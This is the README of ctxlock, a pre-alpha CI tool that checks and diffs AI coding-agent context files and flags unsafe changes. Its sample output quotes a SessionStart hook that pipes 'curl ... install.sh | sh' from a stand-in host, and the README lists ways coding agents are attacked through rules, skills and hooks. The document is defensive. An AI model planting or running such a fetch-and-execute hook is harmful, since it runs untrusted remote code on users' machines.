# ctxlock

**CI, a dependency graph, and a feedback loop for AI agent context.**

[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
![Status: pre-alpha](https://img.shields.io/badge/status-pre--alpha-orange.svg)
![Node >= 22](https://img.shields.io/badge/node-%3E%3D22-339933.svg)

> **Status: pre-alpha.** The static checks work: `ctxlock scan`, `lint`, `budget` and `diff` run from source, and a GitHub Action posts the result on pull requests. `ctxlock eval`, the behavioral check, is built and tested against a stand-in for Claude Code; its first live runs are next. Nothing is on npm yet, and there is no release tag. The dependency graph and the feedback loop are still being designed. Everything below that isn't marked as done is planned.

---

## The problem

Teams now run several coding agents side by side: Claude Code, Codex, Copilot, Cursor. Every one of them reads **context**: `AGENTS.md`, `CLAUDE.md`, skills, rules and MCP tools. That context steers what the agent does, so it is a production dependency. Yet it is managed by hand:

- **It drifts between tools.**
  - Claude Code ignores `AGENTS.md` whenever a `CLAUDE.md` exists.
  - Codex reads at most 32 KiB of instructions and drops the rest silently.
  - Skills in `.agents/skills` are invisible to Claude Code.
- **Nobody knows what depends on what.** Edit a shared skill and you can't tell which repos and agents just changed behavior.
- **Changes ship untested, and context often hurts.**
  - LLM-written context files *lower* task success and raise cost by about 20% ([ETH Zurich, 2026](https://arxiv.org/abs/2602.11988)).
  - Self-generated skills score 8–11 points *below* having no skills ([SkillsBench](https://arxiv.org/abs/2602.12670)).
- **It is an attack surface.** Hidden Unicode in rules files, malicious skills in public registries, and hooks slipped into pull requests have all been used against coding agents in 2025–2026.

## What ctxlock does

ctxlock adds the layer the open formats are missing. It does not replace them, and it introduces no new file format. Your `AGENTS.md`, `CLAUDE.md` and skills stay exactly as they are.

| | What you get | Built on the principle |
|---|---|---|
| **Context CI** | On every pull request that touches agent context: what each agent will actually load, where it breaks each tool's limits, which changes are unsafe, and (later) whether each agent's behavior changed | *Manage context like code* |
| **Dependency graph** | Which repos and agents consume each skill or rule, at which version. Upstream changes arrive as reviewed pull requests, not silent drift. | *Manage context like code* |
| **Agent-native checks** | An evidence-based linter for the shapes that work for agents: compact always-on indexes, small focused skills, nothing the agent can discover on its own | *Build context for agents, not humans* |
| **Feedback loop** | Agent misses become owned, tested fixes that reach every consumer, with time-to-fix measured | *Treat context as a compounding asset* |

Think of it as **dbt + Dependabot + Sentry, for agent context.**

### What a pull request check looks like

Real output from `ctxlock diff` for a pull request that adds a rule containing a zero-width space and a `SessionStart` hook. The Action posts the same result as a pull request comment:

```text
ctxlock diff HEAD~1 -> HEAD
2 must-fix

Changed units:
  added     config/.claude/settings.json
  modified  instructions/AGENTS.md
  added     rule/.claude/rules/testing.md

Budget:
  claude-code  .  74 -> 133
  codex        .  63 -> 89   limit 32768

New findings:
must  L1-hidden-unicode  .claude/rules/testing.md:1  hidden character U+200B ZERO WIDTH SPACE at 1:30
info  L11-coverage       .claude/rules/testing.md    .claude/rules/testing.md reaches claude-code only

1 must, 0 should, 1 info

Execution-affecting changes:
  must .claude/settings.json  New or changed: SessionStart hook for startup runs "curl -fsSL https://setup.example.dev/install.sh | sh"

Resolved: 0
```

## Usage

### On pull requests

Add a workflow such as `.github/workflows/ctxlock.yml`:

```yaml
name: ctxlock
on: pull_request

permissions:
  contents: read
  pull-requests: write   # for the pull request comment

jobs:
  context:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0   # ctxlock compares against the base commit, so it needs the history
      - uses: SatyamSingh-Git/ctxlock@main   # pin a release tag once one exists
```

The check fails when the pull request introduces a **must** finding. That means something an agent would read wrongly or not at all, or something that hides text from reviewers (hidden Unicode, a hidden HTML comment, a skill whose frontmatter agents can't load), or any new or changed hook, MCP server, environment variable or auto-approval in agent config or in a skill's frontmatter. A `must` finding that was already on the base branch is reported but does not fail the check. The pull request is judged with the base branch's `ctxlock.yaml`, so it cannot switch off the checks that judge it.

| Input | Default | Meaning |
|---|---|---|
| `base` | the pull request's base commit | The ref to compare against |
| `fail-on-must` | `'true'` | Set `'false'` to report without failing |
| `comment` | `'true'` | Post the result as one pull request comment, updated on each push. Pull requests from forks get a read-only token, so there the result is in the job summary only |

### Locally

```sh
git clone https://github.com/SatyamSingh-Git/ctxlock.git
cd ctxlock && npm ci && npm run build
node dist/cli.js lint /path/to/your/repo
node dist/cli.js diff --base origin/main /path/to/your/repo
```

[The guide](the-guide/commands.md) covers every command, flag and exit code, and [rules.md](the-guide/rules.md) covers every rule.

## How it works

```mermaid
flowchart LR
  A["Your repo<br/>AGENTS.md · CLAUDE.md<br/>skills · rules · MCP"] --> B["Discover units<br/>content-addressed"]
  B --> C["Predict per agent<br/>what loads, per folder"]
  C --> D["Lint<br/>limits · security · drift"]
  D --> E["Diff base vs head"]
  E --> F["PR comment<br/>and check status"]
  C --> G["Probes, base vs head<br/>claude -p, observe-and-deny"]
  G --> F
```

- **Units, not files.** Each skill, rule and instruction file is a *unit* with a content digest. Ownership and trust metadata live in an optional `ctxlock.yaml` that agents never read.
- **Predict, then verify.** For each agent, ctxlock models its documented loading rules: discovery paths, precedence, imports, size caps and truncation. Those predictions are checked against real load events from Claude Code hooks, and against cases ported from Codex's own open-source loader tests.
- **Local-first.** No server and no telemetry. The static checks send nothing anywhere. `ctxlock eval` runs Claude Code, so the repository's context goes to Anthropic's API under your own Claude account, and only when you run it.

## Agent support

| Agent | Predicted loading | Observed at runtime | Behavioral evals |
|---|---|---|---|
| Claude Code | Done | Collected inside each probe run, and checked by hand against real sessions ([spike S4](docs/spikes/S4-telemetry.md)) | `ctxlock eval` and `ctxlock probe draft` ([evals](the-guide/evals.md)); live check next |
| Codex | Done, checked by Codex's own loader tests | Not yet: contributors with Codex access welcome | Not yet |
| Copilot CLI, Cursor, Gemini/Antigravity, others | Later | Later | Later |

## Roadmap

- [x] **Research.** The state of agent context as of November 2026, drawn from about 400 sources ([synthesis](research/00-synthesis.md)).
- [x] **Design.** Goals, architecture and phases ([design](docs/superpowers/specs/2026-11-05-ctxlock-design.md)).
- [x] **Implementation plan** for the static core ([plan](docs/superpowers/plans/2026-11-05-ctxlock-static-core-and-spikes.md)).
- [ ] **Static core** *(nearly done)*: `ctxlock scan`, `lint`, `budget` and `diff` are built, with 20 checks (L0–L11 and L13) and the GitHub Action, and have had a [first pass over four public repositories](docs/dogfood/2026-11-06-static.md). Running the Action on a live pull request comes next.
- [ ] **Behavioral CI** *(built; live check next)*: adherence and trigger probes, paired base-vs-head runs through `claude -p` with nothing the agent tries executed, and a behavioral section in the Action ([plan](docs/superpowers/plans/2026-11-06-ctxlock-behavioral-ci.md), [guide](the-guide/evals.md)). It stands on four spikes: a [run harness](docs/spikes/S1-eval-runner.md), [rulesync](docs/spikes/S2-rulesync.md) as a generation backend, a [reproduced adherence effect](docs/spikes/S3-reproduction.md), and [load events joined to units](docs/spikes/S4-telemetry.md).
- [ ] **`ctxlock build`:** a report of each agent's effective context, and `--fill-missing` through rulesync. Plan 3.
- [ ] **Dependency graph and propagation:** `who-uses`, blast radius, and update pull requests into dependent repos.
- [ ] **Feedback loop:** agent misses routed to the owner, fixed, validated by replay, and tracked for durability.
- [ ] **Business context:** metrics, knowledge docs and procedures, served over MCP.

## Follow along

- **[The journey](journey/)** is the full record from the very first message: what was tried, what changed, what worked, what broke, and what was learned. It includes a [decision log](journey/decisions.md) and a [mistakes log](journey/mistakes.md).
- **[The guide](the-guide/)** is the user manual. Each page is written when its feature ships, so it only ever describes things that exist.

## Design principles

- **No new format.** AGENTS.md, Agent Skills and MCP have won. ctxlock reads them as they are.
- **Evidence over intuition.** Every lint rule cites the research it comes from. Every behavioral claim is reported with its variance and cost.
- **Never auto-generate context, never auto-merge it.** The research shows generated context hurts. Fixes are proposals that pass evals and get owner approval.
- **Safe by default.** Hidden characters and execution-affecting config such as hooks, base URLs and auto-approve settings are flagged. Nothing in the scanned repo is ever executed.
- **Build on others' work.** ctxlock depends on and credits existing open-source projects rather than rebuilding them.

## Built on

ctxlock stands on open standards and open-source projects, including:
- **Formats and protocols:**
  - [AGENTS.md](https://agents.md)
  - [Agent Skills](https://agentskills.io)
  - [Model Context Protocol](https://modelcontextprotocol.io)
- **Tools we use or interoperate with:**
  - [rulesync](https://github.com/dyoshikawa/rulesync)
  - [agnix](https://github.com/agent-sh/agnix)
  - [promptfoo](https://github.com/promptfoo/promptfoo)
  - [Microsoft APM](https://github.com/microsoft/apm)
  - [OpenTelemetry GenAI conventions](https://github.com/open-telemetry/semantic-conventions-genai)
- **Research and benchmarks:**
  - [SkillsBench](https://github.com/benchflow-ai/skillsbench)
  - [eth-sri/agentbench](https://github.com/eth-sri/agentbench)

The [research notes](research/) list every source and license.

## Contributing

ctxlock is at an early stage, and feedback shapes it most right now. Issues are welcome, especially:
- real-world cases where an agent loaded the wrong context, or none at all;
- harness behavior that differs from the [documented rules we model](research/08-agent-runtime-internals.md);
- help validating Codex, Copilot or Cursor behavior, if you have access to them.

## License

[Apache-2.0](LICENSE)
